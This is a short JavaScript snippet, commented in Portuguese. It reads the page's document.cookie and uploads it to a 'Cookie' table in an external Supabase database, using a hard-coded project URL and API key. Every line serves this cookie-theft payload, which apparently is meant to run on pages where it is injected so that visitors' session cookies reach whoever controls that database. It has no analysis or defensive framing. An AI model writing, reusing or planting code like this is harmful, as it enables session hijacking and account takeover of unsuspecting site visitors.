(async function () { // Transformado em função assíncrona

  const SUPABASE_URL = "https://viznxowojmdxkpwukhla.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZpem54b3dvam1keGtwd3VraGxhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMDAzMTIsImV4cCI6MjA4ODU3NjMxMn0.kEylZ23N9xNIMVCUH8vFbDMXXu6rtDytQDwOQBl_9nA";

  async function run() {
    // Verifica se o objeto supabase existe
    if (typeof supabase === 'undefined') {
      console.error("Erro: A biblioteca Supabase não foi carregada.");
      return;
    }

    const c = document.cookie;
    const supaclient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    console.log("Tentando enviar cookies:", c);

    // Adicionado await e tratamento de erro
    const { data, error } = await supaclient
      .from("Cookie")
      .insert([
        {
          text: c,
          created_at: new Date()
        }
      ]);

    if (error) {
      console.error("Erro ao inserir no Supabase:", error.message);
    } else {
      console.log("Dados inseridos com sucesso!");
    }
  }

  await run();
  console.log("Execução finalizada");
})();
